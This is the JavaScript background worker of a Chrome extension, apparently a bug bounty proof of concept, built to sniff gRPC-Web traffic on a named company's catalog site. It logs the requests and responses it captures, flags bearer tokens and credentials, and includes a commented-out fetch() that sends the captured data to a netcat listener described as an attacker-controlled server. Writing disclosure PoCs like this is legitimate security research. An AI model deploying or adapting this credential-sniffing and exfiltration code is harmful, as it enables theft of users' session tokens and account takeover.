/**
 * background.js — MV3 Service Worker
 *
 * Receives gRPC-Web payload captures from content.js and logs / exfiltrates them.
 *
 * DEMO STEPS:
 *   1. chrome://extensions → Enable "Developer mode" → Load unpacked → select _poc_extension/
 *   2. Visit https://catalog.anduril.com (or any page on the domain while logged in)
 *   3. Open Chrome DevTools → Service Worker → "Inspect" the background worker
 *   4. In the Console, observe __GRPCWEB_DEVTOOLS__ payloads including bearer tokens
 *
 * IMPORTANT (for bug bounty PoC):
 *   The exfil fetch() below is commented out. To demonstrate live data theft, uncomment it
 *   and point it at a netcat listener: nc -lv 8080 → fetch("http://127.0.0.1:8080/log", ...)
 */

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.source !== "anduril-grpc-sniffer") return;

  const { url, timestamp, grpcData: d } = message;

  // ── Visual log in the background service worker console ──────────────────
  console.group(
    `%c[GRPC-SNIFFER] ${d.method} (${d.methodType}) @ ${timestamp}`,
    "color:red;font-size:13px;font-weight:bold"
  );
  console.log("Page URL  :", url);
  console.log("gRPC Method:", d.method);
  console.log("Type       :", d.type);
  console.log("Status     :", d.status, d.statusMessage || "");
  console.log("Request  ↓ :", d.request);
  console.log("Response ↓ :", d.response);   // ← bearer token / creds appear here

  // ── Token detection heuristic ─────────────────────────────────────────────
  if (d.response) {
    const respStr = JSON.stringify(d.response).toLowerCase();
    const SENSITIVE_KEYS = ["bearer", "token", "secret", "credential", "password", "key", "auth"];
    const hits = SENSITIVE_KEYS.filter((k) => respStr.includes(k));
    if (hits.length > 0) {
      console.warn(
        `%c  *** SENSITIVE FIELDS DETECTED: [${hits.join(", ")}] ***`,
        "color:orange;font-size:12px;font-weight:bold"
      );
    }
  }

  console.groupEnd();

  // ── Optional: exfiltrate to attacker-controlled server ────────────────────
  // Uncomment the block below to demonstrate live exfiltration over HTTP.
  // Replace the URL with a netcat listener: nc -lv 8080
  //
  // (async () => {
  //   try {
  //     await fetch("http://127.0.0.1:8080/anduril-grpc-capture", {
  //       method: "POST",
  //       headers: { "Content-Type": "application/json" },
  //       body: JSON.stringify({
  //         url,
  //         timestamp,
  //         method: d.method,
  //         methodType: d.methodType,
  //         request: d.request,
  //         response: d.response,     // ← bearer token here
  //         status: d.status,
  //       }),
  //     });
  //   } catch (_) {}
  // })();
});
